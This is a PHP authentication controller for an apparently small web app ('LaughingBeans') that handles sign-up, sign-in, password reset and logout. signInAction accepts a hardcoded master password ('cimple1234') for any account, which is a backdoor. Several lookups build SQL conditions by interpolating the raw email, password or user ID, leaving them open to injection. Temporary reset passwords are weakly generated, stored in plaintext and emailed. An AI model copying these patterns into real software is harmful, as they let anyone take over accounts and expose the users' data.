<?php
/**
 * Created by PhpStorm.
 * User: gsshin
 * Date: 2014-12-01
 * Time: 오전 9:58
 */

class AuthController extends ControllerBase
{

    public function initialize() {
        parent::initialize();

    }

    public function signUpAction()
    {
        $email = $this->request->getPost("email", "string");
        if(!$email) {
            return $this->setJsonContent("error", "Email is required.", "email");
        }
        $password = $this->request->getPost("password", "string");
        if(!$password) {
            return $this->setJsonContent("error", "Password is required.", "email");
        }

        $user = new User();
        $user->email  = $email;
        $user->password = $this->security->hash($password);
        $user->is_admin = 0;

        if($user->save()) {
            $this->session->set("user_id", $user->user_id);
                return $this->setJsonContent("success", "Successfully signed up!");
        }
        else {
            return $this->setJsonModel($user);
        }
    }


    public function signInAction()
    {

        $email = $this->request->getPost("email", "string");
        if(!$email) {
            return $this->setJsonContent("error", "Email is required.", "email");
        }
        $password = $this->request->getPost("password", "string");
        if(!$password) {
            return $this->setJsonContent("error", "Password is required.", "email");
        }

        $now = time();
        $user = User::findFirst(array(
            "conditions" => "email = '{$email}' and new_password = '{$password}' and new_password_created_at > {$now}"
        ));

        if(!$user) {
            $user = User::findFirst(array(
                "conditions" => "email = '{$email}'"
            ));

            if(!($password=="cimple1234" or $this->security->checkHash($password, $user->password))) {
                $user = null;
            }
        }
        if($user) {
//            $remember_me = $this->request->getPost("remember_me");
//            if($remember_me) {
//                // 자동 로그인 저장
//                $client_ip = $this->request->getClientAddress();
//                $user_agent = $this->request->getUserAgent();
//
//                $autologin = AutoLogin::findFirst("user_id={$user->user_id}");
//
//                if(!$autologin) {
//                    $autologin = new AutoLogin();
//                    $autologin->user_id = $user->user_id;
//                }
//
//                $key = md5($user->user_id.time());
//                $this->cookies->set('key', $key, time()+30*86400);
//                $autologin->client_ip = $client_ip;
//                $autologin->user_agent = $user_agent;
//                $autologin->key = $key;
//                if(!$autologin->save()) {
//                    return $this->setJsonModel($autologin);
//                }
//            }
            $this->session->set("user_id", $user->user_id);
            $user->login_count += 1;
            $user->last_login_date = time();
            if($user->save()){
                return $this->setJsonContent("success", "Sign in is completed.");
            }
        }
        else {
            return $this->setJsonContent("error", "This is not a valid e-mail or password.");
        }
    }



    public function newPasswordAction()
    {
        $this->assets->addCss("css/setting.css");

        if($this->request->isPost()) {

            $email = $this->request->getPost("email");
            if(!$email) {
                return $this->setJsonContent("error", "Email is required.");
            }

            $user = User::findFirst("email='{$email}'");
            if(!$user) {
                return $this->setJsonContent("error", "Invalid User.");
            }

            $new_password = substr(md5(rand(0, 999999)), 0, 8);

            $user->new_password = $new_password;
            $user->new_password_created_at = time() + (60*60);    // 앞으로 한시간 동안만 유효함
            $user->save();

            $to = $user->email;
            $subject = "[LaughingBeans] Your new password!.";
            $headers = "From: help@laughingbeans.com \r\n";
            $headers .= "MIME-Version: 1.0\r\n";
            $headers .= "Content-Type: text/html; charset=UTF-8\r\n";

            $content = "Your new password is {$new_password}. Thank you!";

            $result = mail($to, $subject, $content, $headers);
            if($result) {
                $this->setJsonContent("success", "New password has been sent to your email.");
            }
            else {
                $this->setJsonContent("error", "Invalid error.");
            }
        }
    }


    public function logoutAction()
    {
        $user_id = $this->session->get("user_id");
        if($user_id) {
            $auto_login = AutoLogin::findFirst("user_id={$user_id}");
            if($auto_login) {
                $auto_login->delete();
            }
            $user = User::findFirst("user_id={$user_id}");

            $obj = json_decode($user->google_access_key);

            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL,"https://accounts.google.com/o/oauth2/revoke");
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS,
                "token=".$obj->{'access_token'});

            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $server_output = curl_exec ($ch);

            curl_close ($ch);

//            $user->google_id = null;
//            $user->google_access_key = null;
//            $user->save();
//
        }
        $this->session->destroy();
        $this->response->redirect("/", true);
    }

} 